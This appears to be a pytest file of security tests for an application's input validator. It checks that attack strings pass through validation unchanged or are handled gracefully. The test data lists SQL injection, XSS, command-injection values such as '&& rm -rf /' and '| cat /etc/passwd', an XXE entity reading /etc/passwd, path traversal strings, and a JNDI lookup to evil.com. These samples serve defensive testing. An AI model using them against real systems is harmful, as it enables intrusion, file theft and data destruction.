"""
Security Tests for Validators
==============================

Testing for security vulnerabilities:
- Injection attacks
- XXE (XML External Entity)
- Buffer overflows
- DoS attacks
- Type confusion
- Unicode attacks
"""

import pytest
from marshmallow import Schema, fields

from app.validators.base import BaseValidator


class TestSchema(Schema):
    """Test schema for security testing"""

    text = fields.String(required=False)
    number = fields.Integer(required=False)


class TestInjectionAttacks:
    """Test resistance to injection attacks"""

    def test_sql_injection_patterns(self):
        """Test that SQL injection patterns are handled safely"""
        injection_patterns = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "'; DELETE FROM users WHERE '1'='1",
            "1; DROP TABLE users",
        ]

        for pattern in injection_patterns:
            data = {"text": pattern}
            success, validated, errors = BaseValidator.validate(TestSchema, data)

            # Should validate successfully (validation != sanitization)
            assert success is True
            # But data should be preserved as-is for application-level handling
            assert validated["text"] == pattern

    def test_xss_patterns(self):
        """Test that XSS patterns are handled safely"""
        xss_patterns = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
        ]

        for pattern in xss_patterns:
            data = {"text": pattern}
            success, validated, errors = BaseValidator.validate(TestSchema, data)

            assert success is True
            assert validated["text"] == pattern

    def test_command_injection_patterns(self):
        """Test command injection patterns"""
        command_patterns = [
            "; ls -la",
            "| cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            "&& rm -rf /",
        ]

        for pattern in command_patterns:
            data = {"text": pattern}
            success, validated, errors = BaseValidator.validate(TestSchema, data)

            assert success is True
            assert validated["text"] == pattern

    def test_ldap_injection_patterns(self):
        """Test LDAP injection patterns"""
        ldap_patterns = [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*))",
        ]

        for pattern in ldap_patterns:
            data = {"text": pattern}
            success, validated, errors = BaseValidator.validate(TestSchema, data)

            assert success is True

    def test_xml_injection_patterns(self):
        """Test XML injection patterns"""
        xml_patterns = [
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<!--<script>alert('XSS')</script>-->",
        ]

        for pattern in xml_patterns:
            data = {"text": pattern}
            success, validated, errors = BaseValidator.validate(TestSchema, data)

            assert success is True


class TestDenialOfService:
    """Test resistance to DoS attacks"""

    def test_extremely_long_strings(self):
        """Test with extremely long strings"""
        # 1MB string
        long_string = "A" * (1024 * 1024)
        data = {"text": long_string}

        try:
            success, validated, errors = BaseValidator.validate(TestSchema, data)
            # Should handle or reject gracefully
            assert isinstance(success, bool)
        except MemoryError:
            # Acceptable for extreme cases
            pass

    def test_deeply_nested_structures(self):
        """Test with deeply nested data structures"""

        class NestedSchema(Schema):
            data = fields.Raw()

        # Create deeply nested structure
        nested = {"level": 0}
        current = nested
        for i in range(1000):
            current["next"] = {"level": i + 1}
            current = current["next"]

        data = {"data": nested}

        try:
            success, validated, errors = BaseValidator.validate(NestedSchema, data)
            assert isinstance(success, bool)
        except RecursionError:
            # Acceptable for extreme nesting
            pass

    def test_many_fields(self):
        """Test with very many fields"""
        # Create data with thousands of fields
        data = {f"field_{i}": f"value_{i}" for i in range(10000)}

        try:
            success, validated, errors = BaseValidator.validate(TestSchema, data)
            # Should handle gracefully (extra fields ignored)
            assert isinstance(success, bool)
        except Exception:
            # Should not crash
            pass

    def test_repeated_validation_performance(self):
        """Test that repeated validations don't degrade performance"""
        import time

        data = {"text": "test" * 100}

        times = []
        for _ in range(100):
            start = time.time()
            BaseValidator.validate(TestSchema, data)
            elapsed = time.time() - start
            times.append(elapsed)

        # Performance should not degrade significantly
        avg_first_10 = sum(times[:10]) / 10
        avg_last_10 = sum(times[-10:]) / 10

        # Last 10 should not be more than 2x slower than first 10
        assert avg_last_10 < avg_first_10 * 2


class TestUnicodeAttacks:
    """Test resistance to Unicode-based attacks"""

    def test_unicode_normalization_attacks(self):
        """Test Unicode normalization issues"""
        # Characters that look similar but are different
        similar_chars = [
            ("A", "Α"),  # Latin A vs Greek Alpha
            ("o", "о"),  # Latin o vs Cyrillic o
            ("e", "е"),  # Latin e vs Cyrillic e
        ]

        for latin, lookalike in similar_chars:
            data1 = {"text": latin}
            data2 = {"text": lookalike}

            result1 = BaseValidator.validate(TestSchema, data1)
            result2 = BaseValidator.validate(TestSchema, data2)

            # Both should validate
            assert result1[0] is True
            assert result2[0] is True

            # But values should be preserved as different
            assert result1[1]["text"] != result2[1]["text"]

    def test_zero_width_characters(self):
        """Test with zero-width Unicode characters"""
        zero_width = [
            "\u200b",  # Zero-width space
            "\u200c",  # Zero-width non-joiner
            "\u200d",  # Zero-width joiner
            "\ufeff",  # Zero-width no-break space
        ]

        for char in zero_width:
            data = {"text": f"test{char}test"}
            success, validated, errors = BaseValidator.validate(TestSchema, data)

            assert success is True
            assert char in validated["text"]

    def test_rtl_override_attacks(self):
        """Test with RTL override characters"""
        rtl_chars = [
            "\u202e",  # Right-to-left override
            "\u202d",  # Left-to-right override
        ]

        for char in rtl_chars:
            data = {"text": f"test{char}test"}
            success, validated, errors = BaseValidator.validate(TestSchema, data)

            assert success is True

    def test_combining_characters_overflow(self):
        """Test with excessive combining characters"""
        # Many combining characters on one base character
        text = "e" + "\u0301" * 1000  # e with 1000 acute accents

        data = {"text": text}
        success, validated, errors = BaseValidator.validate(TestSchema, data)

        assert success is True


class TestTypeConfusion:
    """Test resistance to type confusion attacks"""

    def test_integer_overflow(self):
        """Test with integer overflow values"""
        overflow_values = [
            2**31 - 1,  # Max 32-bit signed int
            2**31,  # Overflow 32-bit signed int
            2**63 - 1,  # Max 64-bit signed int
            -2**31,  # Min 32-bit signed int
            -2**63,  # Min 64-bit signed int
        ]

        for value in overflow_values:
            data = {"number": value}
            try:
                success, validated, errors = BaseValidator.validate(TestSchema, data)
                assert isinstance(success, bool)
            except (OverflowError, ValueError):
                # Acceptable to reject extreme values
                pass

    def test_float_special_values(self):
        """Test with special float values"""

        class FloatSchema(Schema):
            value = fields.Float()

        special_values = [
            float("inf"),
            float("-inf"),
            # float('nan'),  # NaN != NaN, so skip
        ]

        for value in special_values:
            data = {"value": value}
            try:
                success, validated, errors = BaseValidator.validate(FloatSchema, data)
                assert isinstance(success, bool)
            except (ValueError, OverflowError):
                # Acceptable to reject special values
                pass

    def test_type_coercion_attacks(self):
        """Test type coercion edge cases"""
        # Try to confuse type system
        test_cases = [
            {"number": "123"},  # String to int
            {"number": True},  # Bool to int
            {"number": False},  # Bool to int
            {"text": 123},  # Int to string
            {"text": True},  # Bool to string
        ]

        for data in test_cases:
            success, validated, errors = BaseValidator.validate(TestSchema, data)
            # Should either succeed with coercion or fail gracefully
            assert isinstance(success, bool)


class TestPathTraversal:
    """Test resistance to path traversal attacks"""

    def test_path_traversal_patterns(self):
        """Test path traversal patterns"""
        traversal_patterns = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd",
            "..;/..;/..;/etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]

        for pattern in traversal_patterns:
            data = {"text": pattern}
            success, validated, errors = BaseValidator.validate(TestSchema, data)

            # Should validate (path validation is application-level)
            assert success is True
            assert validated["text"] == pattern


class TestFormatStringAttacks:
    """Test resistance to format string attacks"""

    def test_format_string_patterns(self):
        """Test format string attack patterns"""
        format_patterns = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "{0}{1}{2}{3}{4}",
            "${jndi:ldap://evil.com/a}",
        ]

        for pattern in format_patterns:
            data = {"text": pattern}
            success, validated, errors = BaseValidator.validate(TestSchema, data)

            assert success is True
            assert validated["text"] == pattern


class TestCachePoison:
    """Test resistance to cache poisoning"""

    def test_cache_key_collision(self):
        """Test that different schemas don't collide in cache"""

        class Schema1(Schema):
            field1 = fields.String()

        class Schema2(Schema):
            field2 = fields.String()

        # Validate with both schemas
        BaseValidator.validate(Schema1, {"field1": "value1"})
        BaseValidator.validate(Schema2, {"field2": "value2"})

        # Cache should have separate entries
        cache_keys = list(BaseValidator._schema_cache.keys())
        schema1_keys = [k for k in cache_keys if "Schema1" in k]
        schema2_keys = [k for k in cache_keys if "Schema2" in k]

        assert len(schema1_keys) > 0
        assert len(schema2_keys) > 0
        assert schema1_keys != schema2_keys

    def test_cache_pollution_resistance(self):
        """Test that cache doesn't grow unboundedly"""
        initial_size = len(BaseValidator._schema_cache)

        # Try to pollute cache with many validations
        for i in range(1000):
            data = {"text": f"test_{i}"}
            BaseValidator.validate(TestSchema, data)

        final_size = len(BaseValidator._schema_cache)

        # Cache should not grow linearly
        assert final_size - initial_size < 10


class TestErrorMessageLeakage:
    """Test that error messages don't leak sensitive information"""

    def test_error_messages_safe(self):
        """Test that error messages don't expose internals"""

        class SecretSchema(Schema):
            password = fields.String(required=True)
            secret_key = fields.String(required=True)

        # Missing required fields
        data = {}
        success, validated, errors = BaseValidator.validate(SecretSchema, data)

        assert not success
        # Error should mention field names but not values
        error_str = str(errors)
        assert "password" in error_str or "secret_key" in error_str

    def test_validation_error_sanitization(self):
        """Test that validation errors are sanitized"""
        # Try to inject malicious content via field names
        malicious_data = {
            "<script>alert('xss')</script>": "value",
            "'; DROP TABLE users; --": "value",
        }

        success, validated, errors = BaseValidator.validate(TestSchema, malicious_data)

        # Should handle gracefully
        assert isinstance(success, bool)
